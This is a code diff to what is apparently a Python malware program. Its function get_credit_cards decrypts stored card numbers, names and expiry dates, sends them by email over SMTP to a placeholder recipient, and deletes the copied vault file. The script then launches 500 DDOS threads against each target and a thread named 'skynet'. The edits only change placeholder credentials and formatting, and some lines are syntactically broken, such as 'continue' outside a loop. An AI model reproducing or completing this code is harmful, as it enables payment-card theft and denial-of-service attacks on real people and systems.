@@ -28,7 +28,7 @@ net2 = net1[0] + a + net1[1] + a + net1[2] + a
 st1 = 1
 en1 = 256
 en1 = en1 + 1
-global targets =[]
+global targets = []
 
 def find_root():
     path = sys.executable
@@ -200,7 +200,7 @@ def get_credit_cards():
             expire_year = r[3]
             Card_details = "Name in Card: " + username + "\nNumber: " + decrypted_password + "\nExpire Month: " + str(
                     expire_mon) + "\nExpire Year: " + str(expire_year) + "\n" + "*" * 10 + "\n")
-            sender_mail = 'ENTER SENDER'    
+            sender_mail = 'ENTER YOUR EMAIL'    
             receivers_mail = ['ENTER RECIPIENT']    
             message = f"""From: From Person %s  
             To: To Person %s  
@@ -208,7 +208,7 @@ def get_credit_cards():
             {Card_details}  
             """%(sender_mail,receivers_mail)    
             try:    
-                password = 'Enter Password Here'
+                password = 'GMAIL PASSWORD'
                 smtpObj = smtplib.SMTP("gmail.com", 587)   
                 smtpObj.sendmail(sender_mail, receivers_mail, message)      
             except Exception:
@@ -223,14 +223,17 @@ def get_credit_cards():
         os.remove("CCvault.db")
     except Exception as e:
         pass
-    
-get_password()
-get_credit_cards()
+
+try:
+    get_password()
+    get_credit_cards()
+except:
+    continue
 
 for target in targets:
-  for i in range(500):
-    thread = threading.Thread(target=DDOS, (target))
-    thread.start()
+    for i in range(500):
+        thread = threading.Thread(target=DDOS, (target))
+        thread.start()
 
 thread2 = threading.Thread(target=skynet)
-thread2.start()   
+thread2.start()
